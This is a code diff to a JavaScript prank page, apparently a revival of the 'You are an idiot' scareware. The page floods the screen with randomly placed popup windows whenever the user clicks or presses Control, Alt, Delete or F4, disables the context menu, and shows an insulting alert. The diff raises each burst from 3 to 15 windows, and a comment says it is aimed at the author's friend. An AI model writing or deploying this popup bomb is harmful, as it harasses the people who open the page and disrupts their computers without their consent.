@@ -973,7 +973,7 @@ function changeTitle(title) {
 function openWindow(url){let s=Math.min(screen.availWidth/2560,screen.availHeight/1440,1),w=Math.round(357*s),h=Math.round(330*s),l=Math.random()*(screen.availWidth-w),t=Math.random()*(screen.availHeight-h);window.open(url,"_blank",`menubar=no,status=no,toolbar=no,resizable=no,width=${w},height=${h},left=${l},top=${t}`);}
 
 async function proCreate(count) {	
-	for (let i = 0; i < 5; i++) {
+	for (let i = 0; i < count; i++) {
 		openWindow(window.location.pathname);
 		await new Promise(r => setTimeout(r,50));
 	}
@@ -1049,14 +1049,14 @@ requestAnimationFrame(playBall);
  * Requires safe.js & math.js preload.
  */
 document.addEventListener("click", async () => {
-	await proCreate(3);
+	await proCreate(15);
 });
 
 window.onload = playBall;
 window.oncontextmenu = () => false;
 window.onkeydown = async () => {
 	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
-		await proCreate(3); // im trolling my friend for this. i dont expect a real harm to any computer if your reading this github. remember its like a revival stuff 
+		await proCreate(15); // im trolling my friend for this. i dont expect a real harm to any computer if your reading this github. remember its like a revival stuff 
 
 		alert("You are an idiot!");
 	}
